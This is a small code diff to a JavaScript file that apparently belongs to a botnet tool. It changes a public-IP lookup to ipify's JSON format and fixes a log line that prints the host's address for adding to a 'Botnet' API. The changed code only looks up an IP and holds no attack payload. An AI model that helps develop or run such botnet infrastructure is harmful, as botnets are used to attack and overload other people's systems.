@@ -16,9 +16,10 @@ async function scrapeUserAgent() {
   }
 }
 async function fetchData() {
-  const response = await fetch('https://api.ipify.org/');
+  // minta ipify dalam format json
+  const response = await fetch('https://api.ipify.org?format=json');
   const data = await response.json();
-  console.log(`Copy Link This Add To Api Botnet -> http://${data.origin}:${port}`);
+  console.log(`Copy Link This Add To Api Botnet -> http://${data.ip}:${port}`);
   return data;
 }
 
